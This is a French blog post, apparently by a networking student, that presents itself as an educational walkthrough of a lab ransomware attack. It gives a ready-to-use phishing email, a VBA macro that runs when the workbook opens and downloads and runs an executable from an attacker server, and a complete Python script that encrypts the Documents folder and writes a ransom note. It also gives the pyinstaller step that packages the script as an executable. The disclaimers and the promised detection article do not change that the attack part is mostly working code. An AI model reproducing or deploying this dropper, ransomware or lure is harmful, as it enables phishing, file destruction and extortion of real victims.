@@ -1,0 +1,438 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <style>
+        :root {
+            --accent-color: #FF4D4D;
+        }
+    </style>
+
+    
+    
+    
+    
+    
+    
+
+    
+    <title>Anatomie d&#39;une attaque ransomware</title>
+    <meta name="description" content="">
+    <meta name="keywords" content='blog, makhal, cyber, SIEM, BUT R&amp;T, POC, ransomware, python'>
+
+    <meta property="og:url" content="https://makhal.fr/posts/cyber/poc/ransom-poc/">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="Anatomie d&#39;une attaque ransomware">
+    <meta property="og:description" content="">
+    <meta property="og:image" content="https://makhal.fr/images/avatar.jpg">
+    <meta property="og:image:secure_url" content="https://makhal.fr/images/avatar.jpg">
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Anatomie d&#39;une attaque ransomware">
+    <meta name="twitter:description" content="">
+    <meta property="twitter:domain" content="https://makhal.fr/posts/cyber/poc/ransom-poc/">
+    <meta property="twitter:url" content="https://makhal.fr/posts/cyber/poc/ransom-poc/">
+    <meta name="twitter:image" content="https://makhal.fr/images/avatar.jpg">
+
+    
+    <link rel="canonical" href="https://makhal.fr/posts/cyber/poc/ransom-poc/" />
+
+    
+    <link rel="stylesheet" type="text/css" href="/css/normalize.min.css" media="print">
+
+    
+    <link rel="stylesheet" type="text/css" href="/css/main.min.css">
+
+    
+    <link id="dark-theme" rel="stylesheet" href="/css/dark.min.css">
+
+    
+    <script src="/js/bundle.min.893af8dd3b65bd0ffe90e7af33847bd6dc9180b8fa6d6659a212a6f4b62d3e01.js" integrity="sha256-iTr43TtlvQ/&#43;kOevM4R71tyRgLj6bWZZohKm9LYtPgE="></script>
+    
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-6QF6WSBEBS"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'G-6QF6WSBEBS');
+    </script>
+    
+    
+          <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap">
+    
+    
+</head>
+<body>
+        <script type="text/javascript">
+            
+            setThemeByUserPref();
+        </script><header class="header">
+    <nav class="header-nav">
+        
+        
+            <div class="avatar">
+                <a href="https://makhal.fr/">
+                    <img src="https://makhal.fr//images/avatar.jpg" alt="avatar" />
+                </a>
+            </div>
+        
+
+        
+        <div class="nav-title">
+            <a class="nav-brand" href="https://makhal.fr/">makhal.fr</a>
+        </div>
+
+        
+        <div class="nav-links">
+            
+                <div class="nav-link">
+                    <a href="https://makhal.fr/posts/"> Posts </a>
+                </div>
+            
+                <div class="nav-link">
+                    <a href="https://makhal.fr/tags/"> Tags </a>
+                </div>
+            
+                <div class="nav-link">
+                    <a href="https://makhal.fr/pages/about/"> About </a>
+                </div>
+            
+                <div class="nav-link">
+                    <a href="https://www.linkedin.com/in/mohamad-el-akhal-8b8319221/"><span data-feather='linkedin'></span>  </a>
+                </div>
+            
+                <div class="nav-link">
+                    <a href="https://github.com/tutanka01"><span data-feather='github'></span>  </a>
+                </div>
+            
+
+            
+            <span class="nav-icons-divider"></span>
+
+            <div class="nav-link" id="hamburger-menu-toggle">
+                <span id="hamburger-menu-toggle-screen-reader-target" class="sr-only">menu</span>
+                <a>
+                    <span data-feather="menu"></span>
+                </a>
+            </div>
+
+            
+            <ul class="nav-hamburger-list visibility-hidden">   
+                
+                    <li class="nav-item">
+                        <a href="https://makhal.fr/posts/"> Posts </a>
+                    </li>
+                
+                    <li class="nav-item">
+                        <a href="https://makhal.fr/tags/"> Tags </a>
+                    </li>
+                
+                    <li class="nav-item">
+                        <a href="https://makhal.fr/pages/about/"> About </a>
+                    </li>
+                
+                    <li class="nav-item">
+                        <a href="https://www.linkedin.com/in/mohamad-el-akhal-8b8319221/"><span data-feather='linkedin'></span>  </a>
+                    </li>
+                
+                    <li class="nav-item">
+                        <a href="https://github.com/tutanka01"><span data-feather='github'></span>  </a>
+                    </li>
+                
+        </div>
+    </nav>
+</header>
+<main id="content">
+    <div class="post container">
+    <div class="post-header-section">
+        <h1>Anatomie d&#39;une attaque ransomware</h1>
+        <small role="doc-subtitle"></small>
+        <p class="post-date">
+            décembre 8, 2024
+        </p>
+
+        <ul class="post-tags">
+        
+            <li class="post-tag"><a href="https://makhal.fr/tags/cyber">cyber</a></li>
+        
+            <li class="post-tag"><a href="https://makhal.fr/tags/poc">POC</a></li>
+        
+            <li class="post-tag"><a href="https://makhal.fr/tags/ransomware">ransomware</a></li>
+        
+            <li class="post-tag"><a href="https://makhal.fr/tags/python">python</a></li>
+        
+        </ul>
+    </div>
+
+    <div class="post-content">
+        <p>
+            <h1 id="introduction">Introduction</h1>
+<p>Saviez-vous que les ransomwares sont l&rsquo;une des cybermenaces les plus redoutées aujourd&rsquo;hui, causant des milliards de pertes chaque année ? Ce week-end, j&rsquo;ai décidé de faire quelque chose de different, et de plonger dans ce monde fascinant mais aussi inquiétant en créant…</p>
+<p><em><strong>Mon propre ransomware</strong></em></p>
+<p>Rassurez-vous, vous ne risquez rien, je suis quand meme quelqu&rsquo;un de bien :)</p>
+<p>L&rsquo;idée derrière cet article est de vous guider à travers toutes les étapes d&rsquo;une cyberattaque de type ransomware, de sa conception à son analyse. Pour rendre cela plus concret, j&rsquo;ai imaginé un scénario fictif, soutenu par des machines réelles et des configurations bien établies.</p>
+<p>À la fin, nous utiliserons Wazuh pour analyser ce qui s&rsquo;est réellement passé et comprendre comment détecter efficacement ce genre d&rsquo;attaques grâce à ses outils puissants.</p>
+<blockquote>
+<p><em><strong>Note importante</strong></em> : Ce projet est à but exclusivement éducatif. Je décline toute responsabilité quant à l&rsquo;utilisation malveillante des informations ou du code présentés dans cet article.</p>
+</blockquote>
+<h2 id="scenario">Scenario</h2>
+<p>Un utilisateur nommé Mohamad reçoit un email alléchant l&rsquo;informant qu&rsquo;il a gagné un lot de délicieux pains au chocolat. Ravi, il suit les instructions et télécharge un fichier Excel à remplir pour obtenir son prix. Mais en l&rsquo;ouvrant, il découvre une mauvaise surprise : tous les fichiers de son dossier Documents sont chiffrés. Un message apparaît, exigeant une rançon pour récupérer ses données.</p>
+<p>Ce scénario va nous permettre d&rsquo;explorer les étapes suivantes :</p>
+<ul>
+<li><em><strong>Rédiger</strong></em> un email de phishing convaincant.</li>
+<li><em><strong>Créer</strong></em> un fichier Excel malveillant avec une macro VBA.</li>
+<li><em><strong>Développer</strong></em> un ransomware capable de chiffrer les fichiers de la victime.</li>
+</ul>
+<h2 id="prérequis">Prérequis</h2>
+<p>Si jamais vous voulez également <em>simuler</em> cette attaque que je vais vous présenter, vous aurez besoin de 3 machines virtuelles. La première sera bien entendu la victime, où il y aura Windows 10. La deuxième sera l&rsquo;attaquant ; pour cette attaque, je vais me contenter d&rsquo;une machine Debian 12. Enfin, la troisième sera notre serveur Wazuh (pour l&rsquo;installer, voici le lien vers mon article sur <a href="/posts/cyber/decouverte_siem/">Wazuh</a>).</p>
+<h2 id="etape-1--lemail-de-phishing">Etape 1 : L&rsquo;email de phishing</h2>
+<p>Commençons par l’étape la plus importante : c&rsquo;est la seule étape qui déterminera si notre attaque réussira ou non. Nous allons rédiger un email de phishing qui incitera notre victime à télécharger notre fichier Excel malveillant.</p>
+<p>Pour cela, rien de mieux que d’utiliser le point faible de toute personne : la gourmandise. Ici, nous allons convaincre notre victime qu&rsquo;elle a gagné un lot de pains au chocolat et que, pour les recevoir, elle doit télécharger un fichier Excel joint à l&rsquo;email.</p>
+<p>Il existe de nombreux templates que nous pouvons utiliser pour rédiger notre email. Voici un lien qui présente de nombreux emails de phishing ayant été utilisés par le passé :</p>
+<ul>
+<li><a href="https://github.com/rf-peixoto/phishing_pot/tree/main/email">Phishing Emails</a>.</li>
+</ul>
+<p>Mais dans notre cas, qui, je pense, est quand même une idée originale que personne n’a jamais eue, nous allons rédiger notre propre email (on ne va pas se mentir, ChatGPT a pas mal aidé pour ça).</p>
+<hr>
+<p>Bonjour Mr Mohamad,</p>
+<p>Nous sommes ravis de vous informer que vous avez été sélectionné(e) dans le cadre de notre campagne de fidélité pour recevoir un lot exclusif de pains au chocolat frais de votre boulangerie préférée, Les Écureuils Dormants.</p>
+<p>Pour confirmer votre participation et organiser la réception de votre lot, nous vous invitons à :</p>
+<ol>
+<li>Télécharger le fichier Excel en pièce jointe.</li>
+<li>Remplir les informations demandées (nom, prénom, adresse, et coordonnées).</li>
+<li>Nous renvoyer le fichier dûment complété par retour d’e-mail avant le 08/12/2024 .</li>
+</ol>
+<p>Veuillez noter que cette offre est valable jusqu’au 08/12/2024 . Passé ce délai, nous ne pourrons malheureusement plus garantir la disponibilité de votre cadeau.</p>
+<p>Nous vous remercions pour votre fidélité et espérons vous revoir bientôt chez Les Écureuils Dormants.</p>
+<p>Cordialement,<br>
+L’équipe Les Écureuils Dormants
+Service Relation Client</p>
+<hr>
+<p>Ce mail contient tous les éléments nécessaires pour que notre victime tombe dans le panneau : il est bien rédigé (sans faute d’orthographe flagrante), crédible, et surtout gourmand :) .</p>
+<p>Il nous manque maintenant à créer notre fichier Excel malveillant. Pour cela, passons à l’étape 2.</p>
+<h2 id="etape-2--créer-un-fichier-excel-malveillant">Etape 2 : Créer un fichier Excel malveillant</h2>
+<p>Peut-être que vous ne les connaissez pas, mais les professionnels des fichiers Excel utilisent souvent une fonctionnalité très puissante de <em>Excel</em> : les macros <em><strong>VBA</strong></em>. Ces macros <em><strong>VBA</strong></em> permettent, entre autres, de créer des scripts qui s’exécutent dès qu’on ouvre le fichier Excel.</p>
+<p>Un comptable, par exemple, peut économiser des heures de travail en créant une macro <em><strong>VBA</strong></em> qui lui permet de réaliser des calculs automatiquement. Mais un attaquant, lui, peut chiffrer tous les fichiers de la victime dès qu’elle ouvre un fichier Excel. Chacun y trouve son compte.</p>
+<p>Pour ce qui est du fichier Excel en soi, je vais me contenter d’un fichier très basique, avec deux colonnes : une pour le nom de notre victime et une autre pour ses disponibilités.</p>
+<p>Voici à quoi ce fichier Excel basique va ressembler :</p>
+<p><img src="/images/doc/POC-ransom/excel.png" alt="Excel image"></p>
+<p>Je ne suis pas un designer graphique, mais je pense que cela suffit. Passons maintenant à l’écriture de notre macro <em><strong>VBA</strong></em>.</p>
+<p>Pour créer une macro <em><strong>VBA</strong></em>, il suffit de cliquer sur l’onglet <em><strong>Développeur</strong></em>, puis sur Visual Basic. Là, vous pouvez écrire votre macro.</p>
+<p>Voici à quoi va ressembler notre macro VBA. Elle permettra d’aller chercher un fichier (.exe) sur le serveur de notre attaquant et de l’exécuter dès qu’on ouvre le fichier Excel. Je me suis basé sur un script trouvé sur Internet, que j’ai légèrement modifié pour qu’il corresponde à notre scénario :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Private Sub Workbook_Open()
+</span></span><span style="display:flex;"><span>    Dim shellApp As Object
+</span></span><span style="display:flex;"><span>    Set shellApp = CreateObject(<span style="color:#e6db74">&#34;WScript.Shell&#34;</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39; Check if Excel is already running
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Dim excelApp As Object
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    On Error Resume Next
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Set excelApp = GetObject(, &#34;Excel.Application&#34;)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    On Error GoTo 0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#39;</span> Start Excel <span style="color:#66d9ef">in</span> a separate <span style="color:#66d9ef">process</span> <span style="color:#66d9ef">if</span> it is not already running
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">If</span> excelApp Is Nothing Then
+</span></span><span style="display:flex;"><span>        shellApp.Run <span style="color:#e6db74">&#34;excel.exe&#34;</span>, <span style="color:#ae81ff">1</span>, False
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">End</span> <span style="color:#66d9ef">If</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39; Specify the URL of the exe file
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Dim fileURL As String
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    fileURL = &#34;http://192.168.9.105/JeSuisSimpa.exe&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#39;</span> Download the exe file to a temporary location
+</span></span><span style="display:flex;"><span>    Dim tempFilePath As String
+</span></span><span style="display:flex;"><span>    tempFilePath = Environ(<span style="color:#e6db74">&#34;TEMP&#34;</span>) &amp; <span style="color:#e6db74">&#34;\JeSuisSimpa.exe&#34;</span>
+</span></span><span style="display:flex;"><span>    Dim xmlhttp As Object
+</span></span><span style="display:flex;"><span>    Set xmlhttp = CreateObject(<span style="color:#e6db74">&#34;MSXML2.XMLHTTP&#34;</span>)
+</span></span><span style="display:flex;"><span>    xmlhttp.Open <span style="color:#e6db74">&#34;GET&#34;</span>, fileURL, False
+</span></span><span style="display:flex;"><span>    xmlhttp.send
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">If</span> xmlhttp.Status = <span style="color:#ae81ff">200</span> Then
+</span></span><span style="display:flex;"><span>        Dim stream As Object
+</span></span><span style="display:flex;"><span>        Set stream = CreateObject(<span style="color:#e6db74">&#34;ADODB.Stream&#34;</span>)
+</span></span><span style="display:flex;"><span>        stream.Open
+</span></span><span style="display:flex;"><span>        stream.Type = <span style="color:#ae81ff">1</span> <span style="color:#e6db74">&#39; Binary
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        stream.Write xmlhttp.responseBody
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        stream.SaveToFile tempFilePath, 2 &#39;</span> Overwrite
+</span></span><span style="display:flex;"><span>        stream.Close
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">End</span> <span style="color:#66d9ef">If</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">&#39;</span> Execute the downloaded malicious exe file
+</span></span><span style="display:flex;"><span>    shellApp.Run tempFilePath, <span style="color:#ae81ff">1</span>, False
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">End</span> Sub
+</span></span></code></pre></div><blockquote>
+<p>Voila le lient du script original : <a href="https://raw.githubusercontent.com/ravi5hanka/Excel-Malware-Maverick/refs/heads/main/excel-macro-MAL.vba">Excel Macro</a></p>
+</blockquote>
+<p>Donc rien de compliqué : cette macro va s&rsquo;exécuter dès qu&rsquo;on ouvre le fichier Excel. Elle va télécharger un fichier <em><strong>JeSuisSimpa.exe</strong></em> depuis le serveur de notre attaquant et l&rsquo;exécuter. Je vous laisse imaginer ce que fait ce fichier <em><strong>JeSuisSimpa.exe</strong></em>. (Je vais vous spoiler : il chiffre tous les fichiers de la victime).</p>
+<p>Mais cette attaque dépend d&rsquo;un critère <em><strong>essentiel</strong></em> : que notre victime ait activé les macros <em><strong>VBA</strong></em> sur son <em>Excel</em>. Donc, soit elle appuie sur le bouton Activer les macros, soit elle a déjà activé n&rsquo;importe quelle macro dans le passé, et dans ce cas, la macro s&rsquo;exécutera automatiquement sans même lui demander sa permission.</p>
+<h2 id="etape-3--le-ransomware">Etape 3 : Le ransomware</h2>
+<p>Ah, le ransomware ! Je sais que vous avez tous attendu cette étape avec impatience. Le ransomware est au cœur de notre attaque, c&rsquo;est lui qui va chiffrer tous les fichiers de notre victime et lui demander une rançon pour les récupérer.</p>
+<p>Pour notre scénario, j&rsquo;ai décidé de créer un ransomware très basique. Bien entendu, je ne vais pas utiliser des ransomwares créés par les grands criminels, qui, par ailleurs, sont facilement trouvables sur Internet. Au contraire, je vais écrire mon propre ransomware pour que vous puissiez voir à quel point il est facile de créer un code pouvant causer de nombreux dégâts.</p>
+<blockquote>
+<p><em><strong>Note</strong></em> : S&rsquo;il vous plaît, je vous en prie, ne développez pas ce code sur votre machine personnelle, et encore moins ne l&rsquo;exécutez. Une fausse commande peut arriver très rapidement, et vous pourriez perdre tous vos fichiers. Même si, comme vous allez le voir, je vais afficher la clé de déchiffrement, je vous assure que ce n&rsquo;est pas une bonne idée.</p>
+</blockquote>
+<p>Pour créer notre ransomware, je vais utiliser Python et plus précisément la librairie <em><strong>cryptography</strong></em>. Celle-ci va nous permettre de chiffrer les fichiers dans un répertoire de données. Avant de commencer à coder, je vous présente la logique globale de notre ransomware :</p>
+<p>Génération de la clef :</p>
+<ul>
+<li>Nous allons générer une clé de chiffrement, qui permettra de chiffrer les fichiers de la victime. Cette clé sera unique pour chaque victime.</li>
+</ul>
+<p>Ciblage du répertoire des documents :</p>
+<ul>
+<li>Le script identifie et accède au dossier &ldquo;Documents&rdquo; de l&rsquo;utilisateur via son chemin par défaut.</li>
+</ul>
+<p>Chiffrement des fichiers :</p>
+<ul>
+<li>Tous les fichiers présents dans le dossier &ldquo;Documents&rdquo; seront chiffrés avec la clé générée.</li>
+</ul>
+<p>Création d&rsquo;une note de rançon :</p>
+<ul>
+<li>Nous allons créer un fichier texte contenant les instructions pour la victime, ainsi que la manière de récupérer ses fichiers en échange d&rsquo;une rançon.</li>
+</ul>
+<p>Bon, fini de parler, passons au code :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> cryptography.fernet <span style="color:#f92672">import</span> Fernet
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Génération et stockage de la clé</span>
+</span></span><span style="display:flex;"><span>KEY <span style="color:#f92672">=</span> Fernet<span style="color:#f92672">.</span>generate_key()
+</span></span><span style="display:flex;"><span>cipher <span style="color:#f92672">=</span> Fernet(KEY)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encrypt_file</span>(file_path):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">with</span> open(file_path, <span style="color:#e6db74">&#39;rb&#39;</span>) <span style="color:#66d9ef">as</span> file:
+</span></span><span style="display:flex;"><span>            data <span style="color:#f92672">=</span> file<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span>        encrypted_data <span style="color:#f92672">=</span> cipher<span style="color:#f92672">.</span>encrypt(data)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">with</span> open(file_path, <span style="color:#e6db74">&#39;wb&#39;</span>) <span style="color:#66d9ef">as</span> file:
+</span></span><span style="display:flex;"><span>            file<span style="color:#f92672">.</span>write(encrypted_data)
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Renommer le fichier pour ajouter l&#39;extension .poubelle</span>
+</span></span><span style="display:flex;"><span>        new_file_path <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>file_path<span style="color:#e6db74">}</span><span style="color:#e6db74">.poubelle&#34;</span>
+</span></span><span style="display:flex;"><span>        os<span style="color:#f92672">.</span>rename(file_path, new_file_path)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[INFO] </span><span style="color:#e6db74">{</span>file_path<span style="color:#e6db74">}</span><span style="color:#e6db74"> a été chiffré et renommé en </span><span style="color:#e6db74">{</span>new_file_path<span style="color:#e6db74">}</span><span style="color:#e6db74">.&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[ERREUR] Impossible de chiffrer </span><span style="color:#e6db74">{</span>file_path<span style="color:#e6db74">}</span><span style="color:#e6db74">: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">create_ransom_note</span>(directory):
+</span></span><span style="display:flex;"><span>    note_path <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(directory, <span style="color:#e6db74">&#34;README_RECUPERER_VOS_FICHIERS.txt&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(note_path, <span style="color:#e6db74">&#39;w&#39;</span>) <span style="color:#66d9ef">as</span> note:
+</span></span><span style="display:flex;"><span>        note<span style="color:#f92672">.</span>write(
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;Vos fichiers ont été chiffrés. Pour les récupérer, veuillez envoyer 1 BTC à l&#39;adresse suivante: makhalBTC.btc</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;Contactez-nous à mohamadlehacker@makhal.fr pour la clé de déchiffrement.&#34;</span>
+</span></span><span style="display:flex;"><span>        )
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[INFO] Note de rançon créée: </span><span style="color:#e6db74">{</span>note_path<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Chemin du dossier à cibler</span>
+</span></span><span style="display:flex;"><span>    target_directory <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>expanduser(<span style="color:#e6db74">&#34;~/Documents&#34;</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>exists(target_directory):
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[ERREUR] Le dossier </span><span style="color:#e6db74">{</span>target_directory<span style="color:#e6db74">}</span><span style="color:#e6db74"> n&#39;existe pas.&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Récupération des fichiers à chiffrer</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> root, _, files <span style="color:#f92672">in</span> os<span style="color:#f92672">.</span>walk(target_directory):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> file <span style="color:#f92672">in</span> files:
+</span></span><span style="display:flex;"><span>            file_path <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(root, file)
+</span></span><span style="display:flex;"><span>            encrypt_file(file_path)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Création de la note de rançon</span>
+</span></span><span style="display:flex;"><span>    create_ransom_note(target_directory)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Affichage de la clé pour une démonstration éthique</span>
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[INFO] Clé de déchiffrement (gardez-la précieusement): </span><span style="color:#e6db74">{</span>KEY<span style="color:#f92672">.</span>decode()<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    main()
+</span></span></code></pre></div><p>Vous allez me dire : &ldquo;<em>C&rsquo;est tout ?</em>&rdquo; Oui, c&rsquo;est tout. Et pourtant, ce petit bout de code peut rendre inutilisables tous les fichiers d&rsquo;une victime.</p>
+<p>Avant d&rsquo;aller plus loin, je tiens à préciser : je comprends vos préoccupations. Vous vous demandez peut-être si c&rsquo;est une bonne idée de partager un script capable de chiffrer toutes les données de quelqu&rsquo;un. Mais il est important de comprendre que ce genre d&rsquo;outil est déjà accessible à tous. Avec des outils comme ChatGPT et d&rsquo;autres IA, il est devenu incroyablement facile d&rsquo;obtenir ce type de script. Plutôt que de limiter le partage d&rsquo;informations, je pense qu&rsquo;il est crucial de sensibiliser et d&rsquo;éduquer :</p>
+<ul>
+<li>Comment se protéger contre ces attaques.</li>
+<li>Que faire si une telle attaque survient.</li>
+</ul>
+<p>Mon but ici est uniquement éducatif : montrer à quel point un ransomware peut être simple à concevoir et insister sur l&rsquo;importance de la cybersécurité. Ce script n&rsquo;a rien de révolutionnaire ; un simple prompt dans un outil d&rsquo;IA pourrait vous fournir quelque chose de similaire. Ce que je montre, c&rsquo;est que même un étudiant en Réseaux et Télécommunications, avec des compétences de base, peut créer un outil qui pourrait causer des dégâts.</p>
+<p>En ce qui concerne le code, il est bien commenté, donc je ne vais pas m&rsquo;attarder dessus. J&rsquo;ai simplement pris la logique que nous avons définie plus haut, y ai ajouté un peu de gestion d&rsquo;erreurs, et voilà, vous avez votre script ransomware.</p>
+<p>Il faut maintenant, bien entendu, faire en sorte que ce script soit exécuté sur n&rsquo;importe quel système, même s&rsquo;il n&rsquo;y a pas Python d&rsquo;installé dessus. Pour cela, on peut utiliser des outils comme pyinstaller, qui va nous permettre de créer un exécutable à partir de notre script Python.</p>
+<p>Pour créer notre exécutable, il suffit de lancer la commande suivante :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pyinstaller --onefile ransomware.py
+</span></span></code></pre></div><p>Lorsque vous lancerez cette commande, vous obtiendrez un output similaire à celui-ci :</p>
+<p><img src="/images/doc/POC-ransom/pyinstaller.png" alt="PyInstaller"></p>
+<p>Et voilà, dans un dossier <em><strong>dist</strong></em>, vous trouverez votre exécutable, que vous pouvez envoyer à votre serveur C&amp;C.</p>
+<h2 id="lancement-de-lattaque">Lancement de l&rsquo;attaque</h2>
+<p>Maintenant que nous avons tout ce qu&rsquo;il nous faut, il ne nous reste plus qu&rsquo;à lancer notre attaque.</p>
+<p>Pour récapituler, voici toutes les étapes que nous avons réalisées :</p>
+<ul>
+<li>Nous avons rédigé un email de phishing convaincant.</li>
+<li>Nous avons créé un fichier Excel malveillant avec une macro VBA.</li>
+<li>Nous avons développé un ransomware capable de chiffrer les fichiers de la victime.</li>
+</ul>
+<p>Il ne nous reste maintenant plus qu&rsquo;à envoyer notre email à notre victime et attendre qu&rsquo;elle ouvre le fichier Excel.</p>
+<p>Voici une petite vidéo qui vous montre ce qui se passe dès que la victime ouvre le fichier Excel :</p>
+
+
+<style>
+  .video-container {
+    position: relative;
+    width: 100%;
+    max-width: 850px; /* Limite la largeur maximale de la vidéo */
+    height: auto;
+    margin: 0 auto; /* Centre la vidéo horizontalement */
+  }
+
+  .video-container video {
+    width: 100%; /* La vidéo prendra 100% de la largeur du conteneur */
+    height: auto; /* La hauteur sera ajustée proportionnellement */
+  }
+</style>
+
+<div class="video-container">
+  <video src="/images/doc/POC-ransom/RANSOM-POC.mp4" controls></video>
+</div>
+
+<p>Je ne peux pas vous montrer comment la victime a cliqué sur le mail, mais je connais personnellement Mohamad, et je peux vous dire qu&rsquo;un lot gratuit de pains au chocolat, il ne peut pas y résister.</p>
+<h2 id="conclusion">Conclusion</h2>
+<p>Et voilà, nous avons terminé notre attaque de ransomware. Il ne nous reste maintenant plus qu&rsquo;à attendre que la victime nous envoie l&rsquo;argent.</p>
+<p>Plus sérieusement, j&rsquo;espère que cet article vous a plu et qu&rsquo;il vous a permis de mieux comprendre comment fonctionne une attaque de ransomware. Dans un prochain article, je vous montrerai comment analyser cette attaque avec Wazuh. Nous examinerons en détails les logs, les alertes, et nous verrons comment détecter ce genre d&rsquo;attaques.</p>
+<p>D&rsquo;ici là, comme toujours, restez curieux et surtout, restez en sécurité.</p>
+
+        </p>
+        
+        
+    </div>
+
+    <div class="prev-next">
+        
+            
+                
+<div class="prev-post">
+    <p>
+        <a href="/posts/k8s/k8s1-3/">
+            &#8592;
+            :
+            Le debut d&#39;une grande aventure K8s
+        </a>
+    </p>
+    <p class="prev-post-date">
+        décembre 2, 2024
+    </p>
+</div>
+
+
+
+
+            
+        
+    </div>
+</div>
+
+
+
+    
+
+        </main><footer class="footer">
+    
+    
+
+    
+    <span>&copy; 2024 makhal.fr</span>
+    
+</footer>
+</body>
+</html>
